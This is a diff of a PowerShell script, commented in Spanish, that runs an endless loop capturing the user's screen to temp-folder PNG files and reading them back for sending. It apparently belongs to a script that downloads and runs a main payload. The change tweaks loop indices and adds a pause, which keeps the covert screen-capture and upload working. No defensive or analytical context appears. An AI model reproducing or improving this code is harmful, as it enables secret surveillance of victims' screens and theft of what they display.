@@ -20,7 +20,7 @@ DescargarYExecutarScriptPrincipal
 
 # Iniciar bucle de captura y envío de imágenes
 While ($true){
-    For ($i = 0; $i -lt $a; $i++){
+    For ($i = 1; $i -le $a; $i++){
         $Filett = "$env:temp\SC_$i.png"
         Add-Type -AssemblyName System.Windows.Forms
         Add-type -AssemblyName System.Drawing
@@ -31,8 +31,11 @@ While ($true){
         $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphic.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $bitmap.Size)
         $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+
+        # Agregar una pausa de 1 segundo
+        Start-Sleep -Seconds 1
     }
-    For ($i = 0; $i -lt $a; $i++){
+    For ($i = 1; $i -le $a; $i++){
         $fileToSend = "$env:temp\SC_$i.png"
         $fileName = "SC_$i.png"
         $fileBytes = [System.IO.File]::ReadAllBytes($fileToSend)
